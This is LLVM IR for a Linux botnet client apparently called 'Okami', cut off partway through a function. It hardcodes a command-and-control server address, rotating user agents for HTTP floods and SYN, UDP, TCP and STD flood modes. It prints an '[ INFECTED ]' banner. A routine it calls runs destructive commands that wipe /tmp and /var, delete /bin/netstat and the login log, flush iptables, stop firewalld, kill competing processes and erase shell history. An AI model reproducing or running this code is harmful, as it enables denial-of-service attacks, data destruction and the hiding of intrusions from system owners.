; ModuleID = 'host/ir_fla/Okami.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i8, i32, i16, i8* }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon }
%union.anon = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.udphdr = type { %union.anon.1 }
%union.anon.1 = type { %struct.anon.2 }
%struct.anon.2 = type { i16, i16, i16, i16 }
%struct.anon.0 = type { i16, i16, i32, i32, i16, i16, i16, i16 }

@commServer = global [1 x i8*] [i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str, i32 0, i32 0)], align 8
@.str = private unnamed_addr constant [21 x i8] c"168.235.109.208:6963\00", align 1
@useragents = global [59 x i8*] [i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([173 x i8], [173 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([154 x i8], [154 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([112 x i8], [112 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([128 x i8], [128 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([122 x i8], [122 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.72, i32 0, i32 0)], align 16
@.str.15 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36\00", align 1
@.str.16 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.17 = private unnamed_addr constant [150 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)\00", align 1
@.str.18 = private unnamed_addr constant [31 x i8] c"TheSuBot/0.2 (www.thesubot.de)\00", align 1
@.str.19 = private unnamed_addr constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00", align 1
@.str.20 = private unnamed_addr constant [55 x i8] c"BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)\00", align 1
@.str.21 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.22 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.23 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1\00", align 1
@.str.24 = private unnamed_addr constant [48 x i8] c"zspider/0.9-dev http://feedback.redkolibri.com/\00", align 1
@.str.25 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\00", align 1
@.str.26 = private unnamed_addr constant [101 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)\00", align 1
@.str.27 = private unnamed_addr constant [63 x i8] c"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51\00", align 1
@.str.28 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00", align 1
@.str.29 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3\00", align 1
@.str.30 = private unnamed_addr constant [173 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)\00", align 1
@.str.31 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko\00", align 1
@.str.32 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.33 = private unnamed_addr constant [109 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15\00", align 1
@.str.34 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00", align 1
@.str.35 = private unnamed_addr constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00", align 1
@.str.36 = private unnamed_addr constant [60 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3)\00", align 1
@.str.37 = private unnamed_addr constant [103 x i8] c"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\00", align 1
@.str.38 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.39 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60\00", align 1
@.str.40 = private unnamed_addr constant [154 x i8] c"Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532\00", align 1
@.str.41 = private unnamed_addr constant [112 x i8] c"Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US\00", align 1
@.str.42 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0\00", align 1
@.str.43 = private unnamed_addr constant [65 x i8] c"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)\00", align 1
@.str.44 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00\00", align 1
@.str.45 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00\00", align 1
@.str.46 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00\00", align 1
@.str.47 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; cn) Opera 11.00\00", align 1
@.str.48 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00", align 1
@.str.49 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00", align 1
@.str.50 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.6.01001)\00", align 1
@.str.51 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.7.01001)\00", align 1
@.str.52 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.5.01003)\00", align 1
@.str.53 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0\00", align 1
@.str.54 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8\00", align 1
@.str.55 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.56 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko/20100101 Firefox/11.0\00", align 1
@.str.57 = private unnamed_addr constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.0.3705)\00", align 1
@.str.58 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.59 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)\00", align 1
@.str.60 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00", align 1
@.str.61 = private unnamed_addr constant [128 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\00", align 1
@.str.62 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.01\00", align 1
@.str.63 = private unnamed_addr constant [76 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\00", align 1
@.str.64 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\00", align 1
@.str.65 = private unnamed_addr constant [65 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02\00", align 1
@.str.66 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00", align 1
@.str.67 = private unnamed_addr constant [90 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]\00", align 1
@.str.68 = private unnamed_addr constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.69 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.70 = private unnamed_addr constant [122 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.71 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.72 = private unnamed_addr constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\00", align 1
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@scanPid = common global i32 0, align 4
@.str.1 = private unnamed_addr constant [7 x i8] c"x86_64\00", align 1
@.str.2 = private unnamed_addr constant [43 x i8] c"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*\00", align 1
@.str.3 = private unnamed_addr constant [21 x i8] c"rm -rf /var/log/wtmp\00", align 1
@.str.4 = private unnamed_addr constant [14 x i8] c"rm -rf /tmp/*\00", align 1
@.str.5 = private unnamed_addr constant [20 x i8] c"rm -rf /bin/netstat\00", align 1
@.str.6 = private unnamed_addr constant [12 x i8] c"iptables -F\00", align 1
@.str.7 = private unnamed_addr constant [17 x i8] c"pkill -9 busybox\00", align 1
@.str.8 = private unnamed_addr constant [14 x i8] c"pkill -9 perl\00", align 1
@.str.9 = private unnamed_addr constant [16 x i8] c"pkill -9 python\00", align 1
@.str.10 = private unnamed_addr constant [22 x i8] c"service iptables stop\00", align 1
@.str.11 = private unnamed_addr constant [37 x i8] c"/sbin/iptables -F; /sbin/iptables -X\00", align 1
@.str.12 = private unnamed_addr constant [23 x i8] c"service firewalld stop\00", align 1
@.str.13 = private unnamed_addr constant [23 x i8] c"rm -rf ~/.bash_history\00", align 1
@.str.14 = private unnamed_addr constant [22 x i8] c"history -c;history -w\00", align 1
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.133 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.73 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@.str.74 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@SendSTDHEX.hexstring = private unnamed_addr constant [1 x i8*] [i8* getelementptr inbounds ([1021 x i8], [1021 x i8]* @.str.75, i32 0, i32 0)], align 8
@.str.75 = private unnamed_addr constant [1021 x i8] c"/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A\00", align 1
@SendSTD.randstrings = private unnamed_addr constant [26 x i8*] [i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.96, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.99, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.101, i32 0, i32 0)], align 16
@.str.76 = private unnamed_addr constant [17 x i8] c"WYHRzp68omQcEaoW\00", align 1
@.str.77 = private unnamed_addr constant [17 x i8] c"xYjPH0XYQyNnZDd4\00", align 1
@.str.78 = private unnamed_addr constant [20 x i8] c"KaDeNTheBoTNETHeGOD\00", align 1
@.str.79 = private unnamed_addr constant [17 x i8] c"Iger8HgN8DU5Cv2m\00", align 1
@.str.80 = private unnamed_addr constant [17 x i8] c"E0H2DeSLyzQ93Bh2\00", align 1
@.str.81 = private unnamed_addr constant [17 x i8] c"zhYf0MvzTJ1S0ivq\00", align 1
@.str.82 = private unnamed_addr constant [21 x i8] c"oqogARpMjAvdjr9Qsrqj\00", align 1
@.str.83 = private unnamed_addr constant [21 x i8] c"yQAkUvZFjxExI3WbDp2g\00", align 1
@.str.84 = private unnamed_addr constant [21 x i8] c"35arWHE38SmV9qbaEDzZ\00", align 1
@.str.85 = private unnamed_addr constant [17 x i8] c"UQX1v4chpBay13JL\00", align 1
@.str.86 = private unnamed_addr constant [21 x i8] c"a7pInUoLgx1CPFlGB5JF\00", align 1
@.str.87 = private unnamed_addr constant [17 x i8] c"X1k5ICjenaWIZ4Gf\00", align 1
@.str.88 = private unnamed_addr constant [21 x i8] c"S1mQMZYF6uLzzkiULnGF\00", align 1
@.str.89 = private unnamed_addr constant [21 x i8] c"jKdmCH3hamvbN7ZvzkNA\00", align 1
@.str.90 = private unnamed_addr constant [17 x i8] c"1cvFW1QcSuZ627CQ\00", align 1
@.str.91 = private unnamed_addr constant [21 x i8] c"VckeqgSPaAA5jHdoFpCC\00", align 1
@.str.92 = private unnamed_addr constant [21 x i8] c"CwT01MAGqrgYRStHcV0X\00", align 1
@.str.93 = private unnamed_addr constant [21 x i8] c"72qeggInemBIQ5uJc1jQ\00", align 1
@.str.94 = private unnamed_addr constant [21 x i8] c"zwcfbtGDTDBWImROXhdn\00", align 1
@.str.95 = private unnamed_addr constant [21 x i8] c"w70uUC1UJYZoPENznHXB\00", align 1
@.str.96 = private unnamed_addr constant [21 x i8] c"EoXLAf1xXR7j4XSs0JTm\00", align 1
@.str.97 = private unnamed_addr constant [21 x i8] c"UkXK4CDG3OBO1vVufiKv\00", align 1
@.str.98 = private unnamed_addr constant [21 x i8] c"lSvZgNzxkUyChyxw1nSr\00", align 1
@.str.99 = private unnamed_addr constant [21 x i8] c"VQz4cDTxV8RRrgn00toF\00", align 1
@.str.100 = private unnamed_addr constant [17 x i8] c"SllNepLi918c9I8J\00", align 1
@.str.101 = private unnamed_addr constant [10 x i8] c"Kaden1337\00", align 1
@.str.102 = private unnamed_addr constant [4 x i8] c"ALL\00", align 1
@.str.103 = private unnamed_addr constant [2 x i8] c"-\00", align 1
@.str.104 = private unnamed_addr constant [4 x i8] c"SYN\00", align 1
@.str.105 = private unnamed_addr constant [4 x i8] c"RST\00", align 1
@.str.106 = private unnamed_addr constant [4 x i8] c"FIN\00", align 1
@.str.107 = private unnamed_addr constant [4 x i8] c"ACK\00", align 1
@.str.108 = private unnamed_addr constant [4 x i8] c"PSH\00", align 1
@.str.109 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.110 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.111 = private unnamed_addr constant [5 x i8] c"ICMP\00", align 1
@.str.112 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.113 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.114 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.115 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.116 = private unnamed_addr constant [7 x i8] c"STDHEX\00", align 1
@.str.117 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.118 = private unnamed_addr constant [8 x i8] c"EXITFAG\00", align 1
@.str.119 = private unnamed_addr constant [6 x i8] c"CLEAN\00", align 1
@.str.120 = private unnamed_addr constant [19 x i8] c"[Cleaning] [%s:%s]\00", align 1
@.str.123 = private unnamed_addr constant [11 x i8] c"BIG_ENDIAN\00", align 1
@.str.124 = private unnamed_addr constant [14 x i8] c"LITTLE_ENDIAN\00", align 1
@.str.125 = private unnamed_addr constant [13 x i8] c"BIG_ENDIAN_W\00", align 1
@.str.126 = private unnamed_addr constant [16 x i8] c"LITTLE_ENDIAN_W\00", align 1
@.str.127 = private unnamed_addr constant [8 x i8] c"UNKNOWN\00", align 1
@.str.121 = private unnamed_addr constant [17 x i8] c"/etc/resolv.conf\00", align 1
@.str.122 = private unnamed_addr constant [39 x i8] c"nameserver 8.8.8.8\0Anameserver 8.8.4.4\0A\00", align 1
@.str.128 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.129 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.130 = private unnamed_addr constant [35 x i8] c"[ INFECTED ] Arch: %s || Type: %s]\00", align 1
@.str.131 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.132 = private unnamed_addr constant [2 x i8] c" \00", align 1

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define void @RemoveTempDirs() #0 {
  %1 = call i32 @system(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.2, i32 0, i32 0))
  %2 = call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.3, i32 0, i32 0))
  %3 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.4, i32 0, i32 0))
  %4 = call i32 @system(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.5, i32 0, i32 0))
  %5 = call i32 @system(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.6, i32 0, i32 0))
  %6 = call i32 @system(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.7, i32 0, i32 0))
  %7 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.8, i32 0, i32 0))
  %8 = call i32 @system(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.9, i32 0, i32 0))
  %9 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.10, i32 0, i32 0))
  %10 = call i32 @system(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.11, i32 0, i32 0))
  %11 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.12, i32 0, i32 0))
